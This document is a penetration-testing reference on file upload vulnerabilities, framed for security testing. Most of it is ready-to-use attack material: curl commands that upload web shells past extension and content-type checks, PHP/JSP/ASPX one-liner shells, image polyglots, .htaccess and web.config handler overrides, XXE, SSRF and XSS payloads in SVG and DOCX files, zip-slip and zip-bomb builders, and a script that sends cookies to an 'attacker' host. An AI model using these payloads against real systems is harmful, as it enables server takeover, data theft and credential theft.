# File Upload Attacks Reference

## 1. Overview

File upload vulnerabilities allow attackers to execute arbitrary code, overwrite critical files, or pivot to further attacks by abusing insufficient validation of uploaded content. These flaws are critical in banking KYC portals, CMS platforms (Pimcore), and Spring Boot applications where user-supplied documents are processed server-side.

## 2. When to Test

- Profile picture / avatar upload functionality
- Document upload (KYC: ID scans, proof of address, bank statements)
- CMS media managers (Pimcore Assets, DAM)
- API endpoints accepting multipart/form-data
- Import features (CSV, XML, ZIP, DOCX)
- Any endpoint with `enctype="multipart/form-data"` or `Content-Type: multipart/`
- Cloud storage pre-signed URL flows (S3, GCS)
- Resume/attachment uploads in support portals

## 3. Techniques

### Content-Type Bypass

```bash
# Server checks Content-Type header only
curl -F "file=@shell.php;type=image/png" https://target/upload

# Double content-type
curl -F "file=@shell.php;type=image/jpeg" -H "Content-Type: multipart/form-data" https://target/upload
```

### Extension Bypass

```bash
# Double extension
curl -F "file=@shell.php.jpg;type=image/jpeg" https://target/upload
curl -F "file=@shell.jpg.php;type=image/jpeg" https://target/upload

# Null byte (legacy PHP < 5.3.4, Java old versions)
curl -F "file=@shell.php%00.jpg;type=image/jpeg" https://target/upload

# Case variation
curl -F "file=@shell.pHp;type=image/jpeg" https://target/upload
curl -F "file=@shell.PhP5;type=image/jpeg" https://target/upload

# Lesser-known executable extensions
curl -F "file=@shell.phtml;type=image/jpeg" https://target/upload
curl -F "file=@shell.pht;type=image/jpeg" https://target/upload
curl -F "file=@shell.php7;type=image/jpeg" https://target/upload
curl -F "file=@shell.shtml;type=image/jpeg" https://target/upload
curl -F "file=@shell.jspx;type=image/jpeg" https://target/upload
curl -F "file=@shell.aspx;type=image/jpeg" https://target/upload

# Trailing dots/spaces (Windows IIS)
curl -F "file=@shell.asp.;type=image/jpeg" https://target/upload
curl -F "file=@shell.asp ::$DATA;type=image/jpeg" https://target/upload

# URL-encoded dots/slashes in extension
curl -F "file=@shell%2Ephp;type=image/jpeg" https://target/upload
curl -F "file=@shell.p%68p;type=image/jpeg" https://target/upload

# Multibyte unicode (converted to null/dot after normalization)
# \xC0\x2E, \xC4\xAE, \xC0\xAE → may translate to . or null
curl -F "file=@shell.php$(printf '\xc0\x2e')jpg;type=image/jpeg" https://target/upload

# Semicolon truncation (IIS/ASP)
curl -F "file=@shell.asp;.jpg;type=image/jpeg" https://target/upload
```

### Filename Path Traversal

```bash
# Overwrite files outside upload dir
curl -F "file=@shell.php;filename=../../../var/www/html/shell.php" https://target/upload
curl -F "file=@shell.jsp;filename=..%2f..%2f..%2fwebapps/ROOT/shell.jsp" https://target/upload

# Windows path traversal
curl -F "file=@shell.aspx;filename=..\..\wwwroot\shell.aspx" https://target/upload
```

### Magic Bytes Polyglots

```bash
# GIF89a + PHP
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.php.gif
curl -F "file=@polyglot.php.gif;type=image/gif" https://target/upload

# PNG + PHP (valid PNG header + PHP in tEXt chunk)
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > polyglot.png.php
curl -F "file=@polyglot.png.php;type=image/png" https://target/upload

# JPEG comment injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg
curl -F "file=@shell.php.jpg;type=image/jpeg" https://target/upload

# PDF + PHP
printf '%%PDF-1.4 <?php system($_GET["cmd"]); ?>' > polyglot.pdf.php
curl -F "file=@polyglot.pdf.php;type=application/pdf" https://target/upload
```

### Race Conditions

```bash
# Upload then access before server-side cleanup/rename
# Terminal 1: rapid upload loop
while true; do curl -F "file=@shell.php;type=image/png" https://target/upload; done

# Terminal 2: rapid access attempts
while true; do curl https://target/uploads/shell.php?cmd=id; done

# Spring Boot: temp file race (multipart temp not cleaned immediately)
# Upload large file, access /tmp/spring-upload-* before GC
```

### PUT Method Upload (No Form Required)

```bash
# Some servers accept PUT to upload files directly
curl -X PUT https://target/uploads/shell.php \
  -H "Content-Type: application/x-httpd-php" \
  -d '<?php system($_GET["cmd"]); ?>'

# WebDAV enabled (common misconfiguration)
curl -X PUT https://target/shell.php \
  -H "Content-Type: text/plain" \
  -d '<?php system($_GET["cmd"]); ?>'

# Check if PUT is allowed
curl -X OPTIONS https://target/ -D - | grep -i "allow:"
# Look for: PUT, MOVE, COPY, MKCOL (WebDAV methods)

# MOVE after PUT (bypass extension check on PUT, rename after)
curl -X PUT https://target/shell.txt -d '<?php system($_GET["cmd"]); ?>'
curl -X MOVE https://target/shell.txt \
  -H "Destination: https://target/shell.php"
```

### .htaccess / .user.ini Upload

```bash
# Apache: make .jpg files execute as PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -F "file=@.htaccess;type=text/plain" https://target/upload
curl -F "file=@shell.jpg;type=image/jpeg" https://target/upload

# PHP .user.ini: auto-prepend
echo 'auto_prepend_file=shell.jpg' > .user.ini
curl -F "file=@.user.ini;type=text/plain" https://target/upload
```

## 4. Server-Specific

### Apache .htaccess

```apache
# Execute .jpg as PHP
AddType application/x-httpd-php .jpg .png .gif

# Or via handler
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### IIS web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspx" path="*.jpg" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### Nginx Path Confusion (cgi.fix_pathinfo=1)

```bash
# Upload legit image with PHP in metadata, access as:
curl https://target/uploads/avatar.jpg/x.php
# Nginx passes to PHP-FPM which executes avatar.jpg as PHP

# Also: path truncation
curl https://target/uploads/avatar.jpg%00.php
```

### Tomcat / Spring Boot JSP

```bash
# JSP upload (if upload dir is within webapp context)
curl -F "file=@shell.jsp;type=image/jpeg" https://target/upload

# Spring Boot: by default no JSP execution in embedded Tomcat
# But if deployed as WAR to external Tomcat:
curl -F "file=@shell.jsp;filename=../webapps/ROOT/shell.jsp" https://target/upload

# JSPX (XML-based JSP, sometimes bypasses filters)
curl -F "file=@shell.jspx;type=application/xml" https://target/upload

# Spring Content-Disposition filename injection
curl -X POST https://target/api/upload \
  -H "Content-Type: multipart/form-data; boundary=----x" \
  --data-binary $'------x\r\nContent-Disposition: form-data; name="file"; filename="../templates/shell.html"\r\nContent-Type: text/html\r\n\r\n<div th:fragment="x" th:utext="${T(java.lang.Runtime).getRuntime().exec(\'id\')}">x</div>\r\n------x--'
```

## 5. Exploitation Payloads

### PHP One-Liner Shell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?=`$_GET[0]`?>
```

### JSP One-Liner Shell

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>
```

### ASPX One-Liner Shell

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()%>
```

### XSS via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="0" y="20">XSS</text>
</svg>
```

### XXE via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### XXE via DOCX

```bash
# Unzip docx, inject XXE in [Content_Types].xml or word/document.xml
mkdir docx_exploit && cd docx_exploit
unzip ../legit.docx
# Edit word/document.xml to include:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker/xxe">]>
# Reference &xxe; in document body
zip -r ../exploit.docx .
curl -F "file=@exploit.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" https://target/upload
```

### SSRF via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100" height="100"/>
</svg>
```

### Zip Bomb (DoS)

```bash
# Create nested zip bomb
dd if=/dev/zero bs=1M count=1024 | zip bomb.zip -
# Or use eicar-style nested: 42.zip (classic)

# Zip slip (path traversal in archive)
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../../tmp/pwned.txt','owned')
"
curl -F "file=@slip.zip;type=application/zip" https://target/upload
```

## 6. Cloud-Specific

### S3 Signed URL Abuse

```bash
# If app generates PUT signed URLs without content-type restriction:
# Upload HTML/JS instead of expected image
curl -X PUT "https://bucket.s3.amazonaws.com/uploads/doc.html?X-Amz-Signature=..." \
  -H "Content-Type: text/html" \
  -d '<html><script>document.location="http://attacker/steal?c="+document.cookie</script></html>'

# Check for public-read ACL on uploaded objects
aws s3api get-object-acl --bucket target-bucket --key uploads/test.jpg

# Content-Type mismatch: signed for image/png but upload text/html
# Some implementations don't enforce Content-Type in signature
```

### GCS ACL Abuse

```bash
# If bucket allows allUsers write or allAuthenticatedUsers
gsutil cp shell.html gs://target-bucket/uploads/
gsutil acl set public-read gs://target-bucket/uploads/shell.html

# Check bucket permissions
curl https://storage.googleapis.com/target-bucket/uploads/test.txt
gsutil iam get gs://target-bucket/
```

## 7. Tools

| Tool | Use Case |
|------|----------|
| `exiftool` | Inject payloads into image metadata, verify magic bytes |
| Burp Upload Scanner (extension) | Automated upload bypass testing |
| `fuxploider` | Automated file upload vulnerability scanner |
| `upload-fuzz-dic-builder` | Generate extension/content-type wordlists |
| `zipslip` | Create path-traversal ZIP archives |
| `docem` | Embed XXE/XSS in DOCX/XLSX/ODT |

```bash
# Exiftool payload injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
exiftool -DocumentName='<svg onload=alert(1)>' image.jpg

# Verify file type detection
file uploaded_file.jpg
exiftool uploaded_file.jpg | grep -i "file type"
```

## 8. Pitfalls

- **Testing only happy path**: Always test with no extension, multiple dots, unicode filenames (`shell.ᵽhp`), and zero-length files
- **Ignoring storage location**: Uploaded files may land in a non-executable directory (S3, blob storage) — confirm the file is accessible and rendered/executed by the server
- **Forgetting async processing**: Some apps process uploads via background jobs (ImageMagick, LibreOffice) — race conditions and delayed execution matter
- **Not checking download/preview endpoints**: Even if upload is safe, the download handler may set wrong `Content-Type` or lack `Content-Disposition: attachment`, enabling stored XSS
- **Overlooking size limits and timeouts**: Large polyglots may be rejected; test with minimal payloads first, then scale up

## 9. Checklist

1. [ ] Map all upload endpoints (forms, APIs, drag-drop, paste)
2. [ ] Test Content-Type header manipulation (change to image/png, application/octet-stream)
3. [ ] Test extension bypasses: double ext, null byte, case, lesser-known (.phtml, .jspx, .ashx)
4. [ ] Test filename path traversal (../ sequences, URL-encoded, backslash on Windows)
5. [ ] Upload magic-byte polyglots (GIF89a+PHP, PNG+PHP, JPEG comment)
6. [ ] Attempt .htaccess / .user.ini / web.config upload
7. [ ] Test SVG upload for XSS, XXE, and SSRF
8. [ ] Test DOCX/XLSX upload for XXE (if server parses documents)
9. [ ] Check race conditions (upload → access before validation/rename)
10. [ ] Verify Content-Disposition on download (stored XSS via inline rendering)
11. [ ] Test cloud-specific: signed URL content-type enforcement, bucket ACLs
12. [ ] Test ZIP/archive uploads for zip-slip path traversal and decompression bombs
